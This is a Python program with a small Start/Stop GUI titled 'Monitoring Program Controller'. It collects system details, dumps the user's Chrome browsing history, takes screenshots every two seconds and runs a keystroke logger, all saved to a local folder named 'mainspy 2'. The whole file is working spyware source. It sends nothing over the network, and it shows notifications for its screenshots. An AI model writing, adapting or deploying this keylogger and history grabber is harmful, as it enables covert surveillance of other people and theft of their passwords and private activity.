import os
import datetime
import socket
import platform
import sqlite3
import threading
import getpass
import shutil
from tkinter import Tk, Button, messagebox
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from plyer import notification

# Global variables
running = False
listener = None
listener_thread = None
screenshot_timer = None

# Ensure the mainspy directory exists
folder_name = "mainspy 2"
os.makedirs(folder_name, exist_ok=True)

# Function to handle keystroke logging
def on_press(key):
    try:
        with open(os.path.join(folder_name, "text.txt"), "a") as f:
            f.write(str(key).replace("'", ""))
            f.write(" ")
    except Exception as e:
        print(f"Error occurred while writing to text file: {e}")

def on_release(key):
    global running
    if key == Key.esc or not running:
        return False

# Function to start keystroke listener
def start_keylogger():
    global listener
    try:
        listener = Listener(on_press=on_press, on_release=on_release)
        listener.start()
        listener.join()
    except Exception as e:
        print(f"Error starting keylogger: {e}")

# Function to get system information
def get_system_info(folder_path):
    try:
        date = datetime.date.today()
        ip_address = socket.gethostbyname(socket.gethostname())
        processor = platform.processor()
        system = platform.system()
        release = platform.release()
        host_name = socket.gethostname()

        system_info = (
            f"Date: {date}\n"
            f"IP Address: {ip_address}\n"
            f"Processor: {processor}\n"
            f"System: {system}\n"
            f"Release: {release}\n"
            f"Host Name: {host_name}\n"
        )

        with open(os.path.join(folder_path, 'system.txt'), 'w') as file:
            file.write(system_info)
    except Exception as e:
        print(f"Error getting system information: {e}")

# Function to find the Chrome history path
def get_chrome_history_path():
    try:
        username = getpass.getuser()
        if platform.system() == 'Windows':
            chrome_path = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
        elif platform.system() == 'Darwin':  # macOS
            chrome_path = os.path.join('/Users', username, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'History')
        else:  # Linux
            chrome_path = os.path.join('/home', username, '.config', 'google-chrome', 'Default', 'History')
        return chrome_path
    except Exception as e:
        print(f"Error finding Chrome history path: {e}")
        return None

# Function to copy database to a temporary location
def copy_database(src_path, dest_path):
    try:
        shutil.copy2(src_path, dest_path)
        return dest_path
    except Exception as e:
        print(f"Failed to copy database: {e}")
        return None

# Function to read Chrome history
def read_chrome_history(db_path, folder_path):
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
        rows = cursor.fetchall()
        with open(os.path.join(folder_path, 'chrome.txt'), 'w', encoding="utf-8") as file:
            for row in rows:
                file.write(f"URL: {row[0]}\nTitle: {row[1]}\nLast Visited: {row[2]}\n\n")
        conn.close()
    except sqlite3.Error as e:
        print(f"Error reading Chrome history: {e}")

# Function to take a screenshot
def take_screenshot(folder_path):
    global screenshot_timer
    try:
        im = ImageGrab.grab()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(folder_path, f"screenshot_{timestamp}.png")
        im.save(screenshot_path)
        print(f"Screenshot saved: {screenshot_path}")
        notification.notify(title="Screenshot taken", message=f"Screenshot saved at {screenshot_path}")
    except Exception as e:
        print(f"Error occurred while taking screenshot: {e}")

    # Schedule the next screenshot in 2 seconds if running
    if running:
        screenshot_timer = threading.Timer(2, take_screenshot, args=[folder_path])
        screenshot_timer.start()

# Main function to execute all components
def main_program():
    global running
    try:
        # Get system information
        get_system_info(folder_name)

        # Extract Chrome history
        chrome_history_path = get_chrome_history_path()
        if chrome_history_path and os.path.exists(chrome_history_path):
            chrome_temp_path = os.path.join(folder_name, "chrome_history")
            if copy_database(chrome_history_path, chrome_temp_path):
                read_chrome_history(chrome_temp_path, folder_name)

        # Start taking screenshots
        running = True
        take_screenshot(folder_name)

        # Start keystroke logger
        start_keylogger()

    except Exception as e:
        print(f"An error occurred: {e}")

def start():
    global listener_thread
    if not listener_thread or not listener_thread.is_alive():
        listener_thread = threading.Thread(target=main_program)
        listener_thread.start()
    messagebox.showinfo("Info", "Monitoring started")

def stop():
    global running, listener, screenshot_timer
    running = False
    if listener:
        listener.stop()
        listener = None
    if screenshot_timer:
        screenshot_timer.cancel()
    messagebox.showinfo("Info", "Monitoring stopped")

def on_closing():
    stop()
    root.destroy()

# GUI setup
root = Tk()
root.title("Monitoring Program Controller")

start_button = Button(root, text="Start", command=start)
start_button.pack(pady=10)

stop_button = Button(root, text="Stop", command=stop)
stop_button.pack(pady=10)

root.protocol("WM_DELETE_WINDOW", on_closing)
root.mainloop()
